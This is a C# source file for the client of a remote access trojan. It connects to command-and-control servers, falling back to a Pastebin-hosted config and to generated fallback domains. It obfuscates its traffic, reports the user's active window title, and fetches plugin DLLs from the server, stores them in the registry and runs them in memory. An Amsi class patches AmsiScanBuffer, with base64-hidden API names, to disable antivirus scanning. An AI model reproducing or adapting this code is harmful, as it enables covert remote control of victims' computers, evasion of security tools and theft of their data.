using Client.Helper;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Net;
using MessagePackLib.MessagePack;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Connection
{
    public static class ClientSocket
    {
        private static TransportManager transportManager;
        private static ConnectionResilience connectionResilience;
        public static Socket TcpClient { get; set; } //Main socket
        public static SslStream SslClient { get; set; } //Main SSLstream
        private static byte[] Buffer { get; set; } //Socket buffer
        private static long HeaderSize { get; set; } //Recevied size
        private static long Offset { get; set; } // Buffer location
        private static Timer KeepAlive { get; set; } //Send Performance
        public static bool IsConnected { get; set; } //Check socket status
        private static object SendSync { get; } = new object(); //Sync send
        private static Timer Ping { get; set; } //Send ping interval
        public static int Interval { get; set; } //ping value
        public static bool ActivatePo_ng { get; set; }
        private static int reconnectAttempts = 0;
        private static readonly int maxReconnectAttempts = 5;

        public static List<MsgPack> Packs = new List<MsgPack>();

        public static void InitializeClient() //Connect & reconnect with TransportManager
        {
            try
            {
                // Initialize TransportManager and ConnectionResilience
                if (transportManager == null)
                {
                    transportManager = new TransportManager();
                    transportManager.AddTransport(new TcpTransport());
                    transportManager.AddTransport(new HttpTransport());
                    
                    connectionResilience = new ConnectionResilience();
                }

                string targetHost;
                int targetPort;

                if (Settings.Paste_bin == "null")
                {
                    // Parse hosts and ports
                    string[] hosts = Settings.Hos_ts.Split(',');
                    string[] ports = Settings.Por_ts.Split(',');

                    // Add to ConnectionResilience
                    foreach (string host in hosts)
                    {
                        connectionResilience.AddPrimaryHost(host.Trim());
                    }
                    foreach (string port in ports)
                    {
                        connectionResilience.AddPort(Convert.ToInt32(port.Trim()));
                    }

                    // Get next target from ConnectionResilience
                    var target = connectionResilience.GetNextTarget();
                    targetHost = target.Item1;
                    targetPort = target.Item2;
                }
                else
                {
                    // Pastebin config
                    using (WebClient wc = new WebClient())
                    {
                        NetworkCredential networkCredential = new NetworkCredential("", "");
                        wc.Credentials = networkCredential;
                        string resp = wc.DownloadString(Settings.Paste_bin);
                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                        targetHost = spl[0];
                        targetPort = Convert.ToInt32(spl[new Random().Next(1, spl.Length)]);
                    }
                }

                // Try to connect using TransportManager
                bool connected = transportManager.Connect(targetHost, targetPort);

                if (connected && transportManager.IsConnected)
                {
                    //Debug.WriteLine("Connected via " + transportManager.GetCurrentTransportType());
                    reconnectAttempts = 0;
                    IsConnected = true;

                    // Get socket and SSL stream from current transport
                    ITransport currentTransport = transportManager.GetCurrentTransport();
                    TcpClient = currentTransport.GetSocket();
                    
                    if (currentTransport is TcpTransport)
                    {
                        SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                        SslClient.AuthenticateAsClient(targetHost, null, SslProtocols.Tls12 | SslProtocols.Tls13, false);
                    }

                    HeaderSize = 4;
                    Buffer = new byte[HeaderSize];
                    Offset = 0;
                    Send(IdSender.SendInfo());
                    Interval = 0;
                    ActivatePo_ng = false;
                    KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                    Ping = new Timer(new TimerCallback(Po_ng), null, 1, 1);
                    
                    if (SslClient != null)
                        SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    reconnectAttempts++;
                    IsConnected = false;
                    
                    // Apply exponential backoff
                    if (reconnectAttempts < maxReconnectAttempts)
                    {
                        connectionResilience.RecordFailure(targetHost, targetPort);
                    }
                    else
                    {
                        // Try DGA fallback domains
                        reconnectAttempts = 0;
                        string[] dgaDomains = DomainGenerator.GetFallbackDomains();
                        foreach (string domain in dgaDomains)
                        {
                            connectionResilience.AddFallbackHost(domain);
                        }
                    }
                    return;
                }
            }
            catch (Exception ex)
            {
                //Debug.WriteLine("Connection failed: " + ex.Message);
                reconnectAttempts++;
                IsConnected = false;
                return;
            }
        }

        private static bool IsValidDomainName(string name)
        {
            return Uri.CheckHostName(name) != UriHostNameType.Unknown;
        }

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Settings.Server_Certificate.Equals(certificate);
        }

        public static void Reconnect()
        {
            try
            {
                Ping?.Dispose();
                KeepAlive?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
                transportManager?.Disconnect();
            }
            catch { }
            IsConnected = false;
        }

        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }
                int recevied = SslClient.EndRead(ar);
                if (recevied > 0)
                {
                    Offset += recevied;
                    HeaderSize -= recevied;
                    if (HeaderSize == 0)
                    {
                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
                        //Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
                        if (HeaderSize > 0)
                        {
                            Offset = 0;
                            Buffer = new byte[HeaderSize];
                            while (HeaderSize > 0)
                            {
                                int rc = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                                if (rc <= 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                                Offset += rc;
                                HeaderSize -= rc;
                                if (HeaderSize < 0)
                                {
                                    IsConnected = false;
                                    return;
                                }
                            }
                            Thread thread = new Thread(new ParameterizedThreadStart(Read));
                            thread.Start(Buffer);
                            Offset = 0;
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                        }
                        else
                        {
                            HeaderSize = 4;
                            Buffer = new byte[HeaderSize];
                            Offset = 0;
                        }
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        return;
                    }
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
                }
                else
                {
                    IsConnected = false;
                    return;
                }
            }
            catch
            {
                IsConnected = false;
                return;
            }
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected)
                    {
                        return;
                    }

                    // Apply traffic obfuscation
                    byte[] obfuscatedMsg = TrafficObfuscator.ApplyMultiLayerObfuscation(msg);

                    byte[] buffersize = BitConverter.GetBytes(obfuscatedMsg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    
                    if (SslClient != null)
                    {
                        SslClient.Write(buffersize, 0, buffersize.Length);

                        if (obfuscatedMsg.Length > 1000000) //1mb
                        {
                            //Debug.WriteLine("send chunks");
                            using (MemoryStream memoryStream = new MemoryStream(obfuscatedMsg))
                            {
                                int read = 0;
                                memoryStream.Position = 0;
                                byte[] chunk = new byte[50 * 1000];
                                while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                                {
                                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                                    SslClient.Write(chunk, 0, read);
                                    SslClient.Flush();
                                }
                            }
                        }
                        else
                        {
                            TcpClient.Poll(-1, SelectMode.SelectWrite);
                            SslClient.Write(obfuscatedMsg, 0, obfuscatedMsg.Length);
                            SslClient.Flush();
                        }
                    }
                    else if (transportManager != null)
                    {
                        transportManager.Send(obfuscatedMsg);
                    }
                }
                catch
                {
                    IsConnected = false;
                    return;
                }
            }
        }

        public static void KeepAlivePacket(object obj)
        {
            try
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "Ping";
                msgpack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
                Send(msgpack.Encode2Bytes());
                GC.Collect();
                ActivatePo_ng = true;
            }
            catch { }
        }

        private static void Po_ng(object obj)
        {
            try
            {
                if (ActivatePo_ng && IsConnected)
                {
                    Interval++;
                }
            }
            catch { }
        }

        
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "Po_ng": //send interval value to server
                        {
                            ClientSocket.ActivatePo_ng = false;
                            MsgPack msgPack = new MsgPack();
                            msgPack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
                            msgPack.ForcePathObject("Message").SetAsInteger(ClientSocket.Interval);
                            ClientSocket.Send(msgPack.Encode2Bytes());
                            ClientSocket.Interval = 0;
                            break;
                        }

                    case "plu_gin": // run plugin in memory
                        {
                            try
                            {
                                if (SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString) == null) // check if plugin is installed
                                {
                                    Packs.Add(unpack_msgpack); //save it for later
                                    MsgPack msgPack = new MsgPack();
                                    msgPack.ForcePathObject("Pac_ket").SetAsString("sendPlugin");
                                    msgPack.ForcePathObject("Hashes").SetAsString(unpack_msgpack.ForcePathObject("Dll").AsString);
                                    ClientSocket.Send(msgPack.Encode2Bytes());
                                }
                                else
                                    Invoke(unpack_msgpack);
                            }
                            catch (Exception ex)
                            {
                                Error(ex.Message);
                            }
                            break;
                        }

                    case "save_Plugin": // save plugin
                        {
                            SetRegistry.SetValue(unpack_msgpack.ForcePathObject("Hash").AsString, unpack_msgpack.ForcePathObject("Dll").GetAsBytes());
                            Debug.WriteLine("plugin saved");
                            foreach (MsgPack msgPack in Packs.ToList())
                            {
                                if (msgPack.ForcePathObject("Dll").AsString == unpack_msgpack.ForcePathObject("Hash").AsString)
                                {                                    
                                    Invoke(msgPack);
                                    Packs.Remove(msgPack);
                                }
                            }
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Invoke(MsgPack unpack_msgpack)
        {
            Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)));
            Type type = assembly.GetType("Plugin.Plugin");
            dynamic instance = Activator.CreateInstance(type);
            instance.Run(ClientSocket.TcpClient, Settings.Server_Certificate, Settings.Hw_id, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BS_OD, Settings.In_stall);
            Received();
        }

        private static void Received() //reset client forecolor
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));//"Received"
            ClientSocket.Send(msgpack.Encode2Bytes());
            Thread.Sleep(1000);
        }

        public static void Error(string ex) //send to logs
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            ClientSocket.Send(msgpack.Encode2Bytes());
        }
    }
    public class Amsi
    {
        // https://twitter.com/_xpn_/status/1170852932650262530
        public static void Bypass()
        {
            string x64 = "uFcA";
            x64 = x64 + "B4DD";
            string x86 = "uFcAB4";
            x86 = x86 + "DCGAA=";
            if (is64Bit())
                PatchA(Convert.FromBase64String(x64));
            else
                PatchA(Convert.FromBase64String(x86));
        }
        private static void PatchA(byte[] patch)
        {
            try
            {
                string liba = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
                var lib = Win32.LoadLibraryA(ref liba);//Amsi.dll
                string addra = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
                var addr = Win32.GetProcAddress(lib, ref addra);//AmsiScanBuffer

                uint oldProtect;
                Win32.VirtualAllocEx(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }

    class Win32
    {
        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32", Encoding.Default.GetString(Convert.FromBase64String("VmlydHVhbFByb3RlY3Q=")));//VirtualProtect

        public delegate int DelegateVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        #region CreateAPI
        [DllImport("kernel32", SetLastError = true)]
        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        public static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }
        #endregion
    }
}
